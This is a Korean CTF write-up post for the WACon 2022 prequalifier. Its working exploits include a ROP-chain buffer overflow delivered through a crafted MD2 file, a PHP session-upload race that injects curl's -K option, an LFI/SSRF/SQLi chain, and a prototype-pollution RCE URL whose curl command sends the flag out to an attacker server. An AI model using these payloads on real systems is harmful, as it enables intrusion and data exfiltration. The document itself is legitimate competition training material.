---
title: "2022 wacon writeup"
slug: 2022-wacon-writeup
date: 2022-06-27T13:00:00+09:00
toc: true
summary: "wacon prequal writeup"
categories:
  - ctf-writeups
---
## towers-of-hanoi

C타워에 있는 모든 디스크를 A타워로 옮긴 후

가장 큰 디스크부터 시작해서 작은디스크까지 A, B 타워에 있는지를 확인하고

있다면 C타워로 옮겨주면 된다.

```python
from pwn import *

def solver(tower, maxDisk):
    answer = ''
    # First move all disk in 3 tower
    for i in tower[2]:
        answer += 'CA'
        tower[0] = [tower[2][0]] + tower[0]
        tower[2] = tower[2][1:]

    print(tower)

    for curDisk in range(maxDisk, 0, -1):
        print('Move %d' % curDisk)
        if curDisk in tower[0]:
            while True:
                if tower[0][0] == curDisk:
                    # move top disk 1->3
                    answer += 'AC'
                    tower[2] = [tower[0][0]] + tower[2]
                    tower[0] = tower[0][1:]
                    break
                else:
                    # move top disk 1->2
                    answer += 'AB'
                    tower[1] = [tower[0][0]] + tower[1]
                    tower[0] = tower[0][1:]
                
        elif curDisk in tower[1]:
            while True:
                if tower[1][0] == curDisk:
                    # move top disk 2->3
                    answer += 'BC'
                    tower[2] = [tower[1][0]] + tower[2]
                    tower[1] = tower[1][1:]
                    break
                else:
                    # move top disk 2->1
                    answer += 'BA'
                    tower[0] = [tower[1][0]] + tower[0]
                    tower[1] = tower[1][1:]
        else:
            pass
    print(tower)
    return answer


p = remote('175.123.252.156', 9999)
p.recvuntil(': ')
d = p.recvline()[:-1]
tower = d.split(',')
tower = list(map(lambda x:list(x), tower))
tower = list(map(lambda x: list(map(lambda y:int(y), x)), tower))
p.sendlineafter('> ', solver(tower, 3))

p.recvuntil(': ')
d = p.recvline()[:-1]
tower = d.split(',')
tower = list(map(lambda x:list(x), tower))
tower = list(map(lambda x: list(map(lambda y:int(y), x)), tower))
p.sendlineafter('> ', solver(tower, 5))

p.recvuntil(': ')
d = p.recvline()[:-1]
tower = d.split(',')
tower = list(map(lambda x:list(x), tower))
tower = list(map(lambda x: list(map(lambda y:int(y), x)), tower))
p.sendlineafter('> ', solver(tower, 9))


p.interactive()
```

__Flag__ : `WACon{y0u_crushed_th3_tow3rs}`



## babystack2022

올려준 링크대로 바로 BOF가 일어난다.

중간에 BOF로 덮히는 변수들에 유의해서 RIP control을 하면 된다.

```python
from pwn import *

syscall = 0x4e29b4
binsh = 0x8B0298
poprdi = 0x000000000041ab0f
poprsi = 0x0000000000587d19
poprdx = 0x00000000005b0972
poprax = 0x00000000005a3cf1
open_ = 0x419680
read = 0x419D50

pay = b"A" * 0x20

pay += p64(poprdi) + p64(binsh)
pay += p64(poprsi) + p64(0x8b02d0)
pay += p64(poprdx) + p64(0)
pay += p64(poprax) + p64(59)
pay += p64(syscall)


'''
pay += p64(poprdi) + p64(binsh)
pay += p64(poprsi) + p64(0)
pay += p64(poprdx) + p64(0)
pay += p64(poprax) + p64(59)
pay += p64(syscall)
'''

pay += "A"*(0x2080 - len(pay))
#pay += b"B"*0x1000
pay += p32(844121161) # magic
pay += p32(8) # version
pay += p32(0) # skinWidth
pay += p32(0) # skinHeight
pay += p32(0x6000) # frameSize
pay += p32(0) # numSkins
pay += p32(1) # numVertices
pay += p32(1) # numTexcoords
pay += p32(1) # numTriangles
pay += p32(0) # numGlcommands
pay += p32(2) # numFrames
pay += p32(0) # offsetSkins
pay += p32(0) # offsetTexcoords
pay += p32(0) # offsetTriangles
pay += p32(0x3000) # offsetFrames
pay += p32(0) # offsetGlCommands
pay += p32(0) # offsetEnd
pay += b"\x00"*36
pay += p64(0x8B0290) # frame
pay += p64(0x8B30C0) # triangles
pay += p64(0x8B30C0) # textureCoords
pay += "\x00"*28
pay += p64(0) # index
pay += "D"*0x24
pay += "E"*0x8 # sfp
pay += "F"*0x8 # ret


md2header = b""
md2header += p32(844121161) # magic
md2header += p32(8) # version
md2header += p32(0) # skinWidth
md2header += p32(0) # skinHeight
md2header += p32(len(pay)) # frameSize
md2header += p32(0) # numSkins
md2header += p32(1) # numVertices
md2header += p32(1) # numTexcoords
md2header += p32(1) # numTriangles
md2header += p32(0) # numGlcommands
md2header += p32(1) # numFrames
md2header += p32(0) # offsetSkins
md2header += p32(0) # offsetTexcoords
md2header += p32(0) # offsetTriangles
md2header += p32(68) # offsetFrames
md2header += p32(0) # offsetGlCommands
md2header += p32(0) # offsetEnd
md2header += pay

md2header += p64(0x00000000005a881c) # 0x8B0298
md2header += '/bin/cat' + p64(0) # 0x8B02a0
md2header += './flag_f8acf1b8ff0ec6bc82cff333029535e7' + '\x00'*1 # 0x8B02a8

md2header += p64(0x8B0298) # 0x8B02b8
md2header += p64(0x8b02a8) # 0x8B02b8
md2header += p64(0) # 0x8B02b8


with open("exp2.md2", "wb") as f:
    f.write(md2header)

p = process(['./MeshConverter', './exp2.md2', '/dev/null'])
#p = remote('114.203.209.118', 8080)
#p.send(md2header)
#p.send(b'\4')
#p.shutdown()
p.interactive()
```

실행 후 생성된 exp2.md2 파일을 서버에 cat exp2.md2 | nc ~~ 식으로 보내주면 된다.

__Flag__ : `WACon{gjslkfjkalsdfjkladsjkfl}`



## Kuncɛlan

`fun_004ded7246` parameter에서 LFI를 통해서 코드를 얻는다.

얻고 나온 SALT + "guest" 형태를 integer range brute forcing를 통해서 SALT를 구하고 SALT + "admin" 형태의 해쉬를 얻어 임의요청이 가능하다.

SALT = 311279614

그 이후 내 서버로 쏘고, 내 서버에서는 header('Location: gopher://localhost:80/~~') 식으로 돌려 SSRF를 가능하게 할 수 있다.

그 이후 JWT를 맞춰서 SQLi를 해서 PART1, 2 플래그를 얻으면 된다.

__Flag__ : `WACon{Try_using_Gophhhher_ffabcdbc}`



## yet_another_baby_web

CURL에는 `-K` 라는 옵션이 있다. 해당 옵션은 파일로 부터 config를 읽어 curl을 실행시켜주는데 이를 이용하여 제한된 조건속에서 임의 요청을 보낼 수 있다. 

임의 파일은 PHP_SESSION_UPLOAD_PROGRESS로 올렸다.

```python
import requests
import threading

headers = {
    'Connection':'close',
    'Cookie':'PHPSESSID=asdqwer'
}

f = open('payload','rb') 
payload = f.read()
padding = b'a'*(8000000-1)
f.close()

data={
    'PHP_SESSION_UPLOAD_PROGRESS':payload,
}

def run():
  requests.post(url='http://110.10.147.146:8000/',cookies={'PHPSESSID':'aqq'}, files={"file":("filename",padding)},data=data,headers=headers)

for i in range(10):
  T = threading.Thread(target=run,args=())
  T.start()

while True:
  print('go')
  res = requests.post(url='http://110.10.147.146:8000/', cookies={'PHPSESSID':'zxcv'}, data={'url': '-K/var/lib/php/sessions/sess_asdqwer'})
  print(res.text)

```

__Flag__ : `WACon{1s_this_w3b_0r_m1sc_IDK}`



## ppower

Prototype Pollution을 통해서 execSync, spawnSync의 option을 적절히 조절할 수 있다.

여기서 shell을 변경함으로 임의 명령이 실행이 가능하고, input, stdio를 통해서 해당 명령에 stdin형태로 명령을 넣어줄 수 있다.

shell = debugfs, input = ![임의명령], stdio=pipe를 줘서 RCE가 가능하다.

```
http://175.123.252.136:8080/answer?constructor[prototype][flagForEveryone][flagForEveryone]=1&constructor[prototype][shell]=/sbin/debugfs&constructor[prototype][stdio]=pipe&constructor[prototype][input]=!curl%20http://MY_SERVER/$(/realreadflag%20flagflagflag)%0aq%0a&answer=It%27s-none-of-your-business
```

__Flag__ : `WACon{node**pp=rce/*:P*/}`